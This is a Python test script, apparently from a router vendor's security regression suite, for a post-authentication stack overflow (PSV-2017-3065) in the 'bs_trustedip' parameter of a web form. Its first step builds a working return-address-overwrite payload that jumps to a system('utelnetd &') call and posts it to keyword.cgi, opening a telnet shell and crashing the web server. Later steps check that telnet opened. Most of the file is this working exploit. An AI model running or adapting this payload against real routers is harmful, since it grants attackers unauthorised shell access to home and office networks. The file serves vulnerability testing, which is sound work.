''' [PSV-2017-3065] Post-Auth Stack Overflow in 0x368c0L through "bs_trustedip(bs_trustedip in nvram)" parameter passed by page BKS_ '''
''' anthor Cloud 2018-01-04'''
'''v1.0 '''
from API._API import *

# #def test_step_0():
    # #log.info( 'step-0-0 dut loaddrfault wait 160s')
    # #aploaddefault()
    # #log.info( "step-0-1 AP Genie over leap done")
    # #Genie_overleap()
#    log.info( "step-0-2 disable changed-url token")
#    Disable_changedToken()

def test_Step_1():
    log.info('step-1 This exploition provide two arbitrary command to open telnetd of the router.If you do not edit it, after the exploiting, you can see the webserver is down and the telnet service opened.')
    url = host + urlBlockSites
    token = getIDToken(url)
    page = 'BKS_keyword.htm'
    cgi = 'keyword.cgi'
    if host == '192.168.0.1':
        ip = '192.168.0.12' 
        cfTrusted_IPAddress3 = "0"
    elif host == '192.168.100.1':
        ip = '192.168.100.12'
        cfTrusted_IPAddress3 = "100"
    else:
        ip = '192.168.1.12' 
        cfTrusted_IPAddress3 = "1"
    Authorization = 'Basic ' + base64.b64encode(user + ':' + passwd) 
    headers = {'Authorization': Authorization}
    payload = ip.ljust(0x14, 'a')
    payload += 'dead' # R4

    payload += struct.pack("I", 0x954cc) # PC(system("utelnetd &"))
    data = {
        "wzWAN_IPFinish":"Apply",
        "skeyword":"never",
        "cfKeyWord_Domain":"",
        "trustipenble":"",
        "cfTrusted_IPAddress1":"192",
        "cfTrusted_IPAddress2":"168",
        "cfTrusted_IPAddress3":cfTrusted_IPAddress3,
        "cfTrusted_IPAddress4":"123",
        "bs_enable":"0",
        "bs_trustedip_enable":"1",
        "bs_trustedip":payload
    }
    post_url = host + '%s' % cgi + token
    log.info(payload)
    r = ''
    try:
        r = requests.post(post_url, headers=headers, data=data,timeout=5)
    except:
        time.sleep(1)
    if r != '':
        log.info(r.status_code)
    time.sleep(5)
    try:
        r1 = requests.get('http://' + hostip + '/%s' % (page), headers=headers)
        log.info(r1.status_code)
    except:
        time.sleep(1)

def test_Step_2():
    log.info( 'step-2 check telnet dut')
    str2 = judjeduttelnet()
    if str2 == 'pass':
        log.info(str2)
        log.info( "check telnet dut pass")
        time.sleep(1)
    else:
        log.info(str2)
        log.info( "check telnet dut fail")
    assert str2 == 'pass', "This action should work." 

def test_Step_3():
    log.info( 'step-3 Make sure the Web GUI should not crash')
    url = "http://" + user + ':' + passwd + "@" + hostip + '/' + urlDevicecontrol
    str = check_DUTnocrash(url)
    assert str == 'pass', "This action should work."
    

